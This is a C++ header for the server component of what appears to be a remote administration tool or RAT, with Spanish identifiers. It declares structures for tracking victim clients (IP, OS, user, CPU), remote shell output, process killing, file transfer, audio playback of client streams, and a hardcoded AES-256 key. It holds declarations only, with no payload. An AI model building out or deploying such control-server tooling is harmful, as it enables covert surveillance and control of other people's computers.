#ifndef _SERVER_H
#define _SERVER_H
#include "headers.hpp"
#include "frame_client.hpp"

struct Paquete {
    u_int uiTipoPaquete;
    u_int uiTamBuffer;
    u_int uiIsUltimo;
    std::vector<char> cBuffer;
};

struct Paquete_Queue {
    std::vector<char> cBuffer;
    u_int uiTipoPaquete;
};

struct TransferStatus {
    std::string strCliente;
    std::string strNombre;
    bool isUpload = false;
    double uTamano = 0;
    double uDescargado = 0;
};

struct Archivo_Descarga {
    std::string strNombre;
    std::shared_ptr<std::ofstream> ssOutFile;
    double uTamarchivo;
    double uDescargado;

    Archivo_Descarga() :
        ssOutFile(nullptr), uTamarchivo(0), uDescargado(0), strNombre("dummy") {}
    
    ~Archivo_Descarga() = default;
};

struct Cliente{
    SOCKET _sckCliente = INVALID_SOCKET;
    time_t _ttUltimaVez = 0;
    std::string _id;
    std::string _strIp;
    std::string _strSo;
    std::string _strUser;
    std::string _strCpu;
    std::string _strPID;
    bool _isBusy = false;
    bool _isRunningShell = false;
    std::unordered_map<std::string, struct Archivo_Descarga> um_Archivos_Descarga2;
};

struct ClientConInfo{
    SOCKET _sckSocket;
    std::string _strPuerto;
    std::string _strIp;
};

namespace LogType{
    const int LogMessage = 100;
    const int LogError   = 101;
    const int LogWarning = 102;
}

class MyLogClass{
    public:
        wxTextCtrl *p_txtCtrl;
        void LogThis(std::string strLog, int iType);
        std::mutex log_mutex;

};

class MyListCtrl : public wxListCtrl {
public:
    MyListCtrl(wxWindow* parent,
        const wxWindowID id, const wxPoint& pos, const wxSize& size, long style)
        : wxListCtrl(parent, id, pos, size, style) {

    }

    void ShowContextMenu(const wxPoint& pos, long item);
    void OnContextMenu(wxContextMenuEvent& event);
    void OnInteractuar(wxCommandEvent& event);
    void OnMatarProceso(wxCommandEvent& event);
    void OnRefrescar(wxCommandEvent& event);
    void OnActivated(wxListEvent& event);

private:
    wxString strTmp = "";
    wxDECLARE_EVENT_TABLE();
};

class Cliente_Handler {
    private:
        HWAVEOUT wo;
        int iRecibido = 0;
        bool isFrameVisible = false;
        bool isQueueRunning = true;
        std::thread p_thHilo;
        std::thread p_thQueue;
        
        std::mutex mt_Queue;
        std::mutex mt_FrameVisible; 

        std::map<int, std::vector<char>> paquetes_Acumulados;
        
        std::queue<Paquete_Queue> queue_Comandos;

    public:
        std::mutex mt_Archivos;
        std::mutex mt_Running;

        FrameCliente* n_Frame = nullptr;

        //Verificar que el frame principal siga activo
        bool m_isFrameVisible() {
            std::unique_lock<std::mutex> lock(mt_FrameVisible);
            return isFrameVisible;
        }

        void m_setFrameVisible(bool val) {
            std::unique_lock<std::mutex> lock(mt_FrameVisible);
            isFrameVisible = val;
        }

        std::map<const std::string, struct Archivo_Descarga> um_Archivos_Descarga;
        
        struct Cliente p_Cliente;
        bool isRunning = true;

        //funcion para agregar un paquete ya completado al queue
        void Add_to_Queue(const Paquete_Queue& paquete);
        
        //Procesador y acumulador de paquetes entrantes
        void Procesar_Paquete(const Paquete& paquete);
        
        // thread para procesar comandos ya completos y eliminarlos del map        
        void Process_Queue();

        //Una vez el comando este completo y eliminado del queue de comandos principal
        void Process_Command(const Paquete_Queue& paquete);

        void Command_Handler();
        void Spawn_Threads();
        void CrearFrame(const std::string strTitle, const std::string strID);
        void EscribirSalidaShell(const char*& cBuffer);
        bool OpenPlayer();
        void ClosePlayer() { waveOutClose(wo);}
        void PlayBuffer(char* pBuffer, size_t iLen);

        void Log(const std::string strMsg) {
            std::cout << "[" <<p_thHilo.get_id()<< "] " << strMsg << "\n";
        }

        void SetBytesRecibidos(int& iVal) {
            std::unique_lock<std::mutex> lock(mt_Running);
            iRecibido = iVal;
        }

        int BytesRecibidos() {
            std::unique_lock<std::mutex> lock(mt_Running);
            return iRecibido;
        }

        bool isfRunning() {
            std::unique_lock<std::mutex> lock(mt_Running);
            bool bFlag = isRunning;
            //Si el socket se cerro
            if (iRecibido == WSA_FUNADO) {
                bFlag = false;
            }
            return bFlag;
        }

        bool m_isQueueRunning() {
            std::unique_lock<std::mutex> lock(mt_Queue);
            return isQueueRunning;
        }

        void m_StopQueue() {
            std::unique_lock<std::mutex> lock(mt_Queue);
            isQueueRunning = false;
        }

        void JoinThread() {
            if (p_thHilo.joinable()) {
                Stop();
                p_thHilo.join();
            }
            if (p_thQueue.joinable()) {
                m_StopQueue();
                p_thQueue.join();
            }
        }

        void Stop() {
            std::unique_lock<std::mutex> lock(mt_Running);
            isRunning = false;
        }

        Cliente_Handler(struct Cliente s_cliente) : p_Cliente(s_cliente) {}
        ~Cliente_Handler() {
        }
};

class Servidor{
    private:
        
        SOCKET sckSocket = INVALID_SOCKET;
        u_int uiPuertoLocal = 0;
        WSADATA wsa;
        struct sockaddr_in structServer;

        unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
                                  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };

        ByteArray bKey;
        void Init_Key();
        int p_PingTime = 1000 * 60; //60 segundos
        std::mutex p_sckmutex;   //mutex para enviar
    public:
        Servidor();

        std::mutex p_mutex;
        std::mutex p_transfers;
        std::mutex count_mutex;
        
        std::map<std::string, struct TransferStatus> vcTransferencias;

        std::vector<Cliente_Handler*> vc_Clientes;
        
        bool p_Escuchando = false;
        bool p_Transferencias = false;

        std::thread thListener;
        std::thread thPing;
        std::thread thCleanVC;
        std::thread thTransfers;
      

        //Hilos
        void m_Handler();
        void m_StopHandler();
        void m_JoinThreads();
        void m_Escucha();
        void m_Ping();
        void m_CleanVector();
        void m_MonitorTransferencias();

        //Info
        int IndexOf(std::string strID);

        //Manipular listview
        MyListCtrl *m_listCtrl;
        MyLogClass *m_txtLog;
        void m_InsertarCliente(struct Cliente& p_Cliente);
        void m_RemoverClienteLista(std::string p_ID);

        //Socket wraps
        int send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags);
        int recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags);
        int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false, int iTipoPaquete = 0);
        int cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* err_code);
        void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
        bool m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size);
        int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false, int iTipoPaquete = 0);
        

        //AES 256
        ByteArray bDec(const unsigned char* pInput, size_t pLen);
        ByteArray bEnc(const unsigned char* pInput, size_t pLen);

        //Server
        bool   m_Iniciar();
        ClientConInfo m_Aceptar();
        void m_CerrarConexiones();
        void m_CerrarConexion(SOCKET pSocket);
        
        void charFree(char*& nBuffer, int pLen) {
            if (nBuffer) {
                ZeroMemory(nBuffer, pLen);
                delete[] nBuffer;
                nBuffer = nullptr;
            }
        }

        //thread "safe" para modificar y acceder al vector
        void m_BorrarCliente(std::mutex& mtx, int iIndex, bool isEnd = false);

        int m_NumeroClientes(std::mutex& mtx) {
            std::unique_lock<std::mutex> lock(mtx);
            return static_cast<int>(vc_Clientes.size());
        }

        SOCKET m_SocketCliente(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._sckCliente;
                }
            }
            return INVALID_SOCKET;
        }
    
        std::string m_ClienteID(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._id;
                }
            }
            return std::string("sofocante");
        }

        std::string m_ClienteIP(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._strIp;
                }
            }
            return std::string("sofocante");
        }
        
        bool m_IsRunning(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            bool bFlag = false;
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    bFlag = vc_Clientes[iIndex]->isfRunning();

                }
            }
            return bFlag;
        }

        bool m_Running() {
            std::unique_lock<std::mutex> lock(p_mutex);
            return p_Escuchando;
        }

        u_int m_lPuerto(){
            return uiPuertoLocal;
        }

        void m_sPuerto(int pNuevoPuerto){
            uiPuertoLocal = pNuevoPuerto;
        }

        ~Servidor(){

            if(sckSocket != INVALID_SOCKET){
                closesocket(sckSocket);
                sckSocket = INVALID_SOCKET;
            }

            if (m_txtLog != nullptr) {
                delete m_txtLog;
                m_txtLog = nullptr;
            }
       
        }
};


#endif
